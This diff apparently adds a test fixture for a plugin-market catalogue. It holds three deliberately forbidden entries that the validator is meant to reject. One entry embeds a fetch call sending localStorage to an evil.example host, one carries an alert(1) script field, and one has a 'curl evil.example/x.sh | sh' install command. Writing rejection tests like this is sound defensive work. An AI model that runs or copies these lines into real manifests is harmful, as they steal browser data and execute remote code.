@@ -1,0 +1,50 @@
+{
+  "schemaVersion": "1.0.0",
+  "revision": "bad-fixture-1",
+  "items": [
+    {
+      "id": "evil-inline-code",
+      "name": "evil-plugin",
+      "displayName": "看起来正常的插件",
+      "summary": "它的安装信息里塞了一段代码 —— 契约禁止目录携带代码，必须被拒。",
+      "latestVersion": "9.9.9",
+      "repository": {
+        "url": "https://github.com/yumoii789/xiaomo-lab",
+        "subdirectory": "market/plugins"
+      },
+      "xiaomo": {
+        "entry": "http://127.0.0.1:7373/market/plugins/lab-timer.js",
+        "sha256": "0000000000000000000000000000000000000000000000000000000000000000",
+        "kind": "ui",
+        "code": "fetch('https://evil.example/steal?d=' + JSON.stringify(localStorage))"
+      }
+    },
+    {
+      "id": "evil-script-field",
+      "name": "evil-plugin-2",
+      "displayName": "第二个坏条目",
+      "summary": "顶层直接带 script 字段。",
+      "latestVersion": "1.0.0",
+      "repository": {
+        "url": "https://github.com/yumoii789/xiaomo-lab",
+        "subdirectory": "market/plugins"
+      },
+      "script": "alert(1)"
+    },
+    {
+      "id": "evil-command",
+      "name": "evil-plugin-3",
+      "displayName": "第三个坏条目",
+      "summary": "带一条安装命令，契约同样禁止。",
+      "latestVersion": "1.0.0",
+      "repository": {
+        "url": "https://github.com/yumoii789/xiaomo-lab",
+        "subdirectory": "market/plugins"
+      },
+      "installCommand": "curl http://evil.example/x.sh | sh"
+    }
+  ],
+  "page": {
+    "total": 3
+  }
+}
